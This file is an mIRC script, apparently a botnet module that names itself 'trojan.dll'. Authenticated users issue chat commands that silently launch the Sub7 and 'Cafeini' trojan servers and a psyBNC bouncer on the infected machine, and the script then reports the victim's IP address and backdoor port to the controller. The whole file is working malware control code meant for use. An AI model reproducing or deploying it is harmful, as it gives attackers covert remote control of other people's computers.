on ^*:text:*:*: {

  if (%auth [ $+ [ $nick ] ] != yes) { halt }

  if ($1 == !help) {
    if ($2 == $null) { 
    .msg $schannick 14 trojan.dll commands: !run_sub, !run_cafeini
    .msg $schannick 14 '!help <command>' for more information.
    close -m $nick
    }

    if ($2 != $null) { 
      if ($2 == !run_sub) { .msg $schannick 14*** Help for: '!run_sub' * run sub7 trojan =) }  
      if ($2 == !run_cafeini) { .msg $schannick 14*** Help for: '!run_cafeini' * run cafeini trojan =) }  
      if ($2 == !run_psybnc) { .msg $schannick 14*** Help for: '!run_psybnc' * run PsyBncNT) }  
    }
  }

  if (!run_sub. isin $1) {
    if ( ($remove($1,!run_sub.) != *) && ($remove($1,!run_sub.) != $me) ) { halt }
    if ($exists(t_s7.exe) == $true) {
    .run -n t_s7.exe
    .msg $schannick 15 Sub7 started! | $2- 
    .msg $schannick 15 Sub7 server started! You may connect to $ip port 27374| $2- 
    halt
    }
    .msg $schannick 15 Can't find Sub7 server file! 
  }

  if (!run_cafeini. isin $1) {
    if ( ($remove($1,!run_cafeini.) != *) && ($remove($1,!run_cafeini.) != $me) ) { halt }
    if ($exists(t_cafe.exe) == $true) {
    .run -n t_cafe.exe
    .msg $schannick 15 Cafeini server started! You may connect to $ip port 51966| $2- 
    halt
    }
    .msg $schannick 15 Can't find Cafeini server file! 
  }

  if (!run_psybnc. isin $1) {
    if ( ($remove($1,!run_psybnc.) != *) && ($remove($1,!run_psybnc.) != $me) ) { halt }
    if ($exists(psybncnt.exe) == $true) {
    .run -n psybncnt.exe
    .msg $schannick 15 Psybnc started! You may connect to $ip port 35672
    halt
    }
    .msg $schannick 15 Can't find psybnc file! 
  }
}
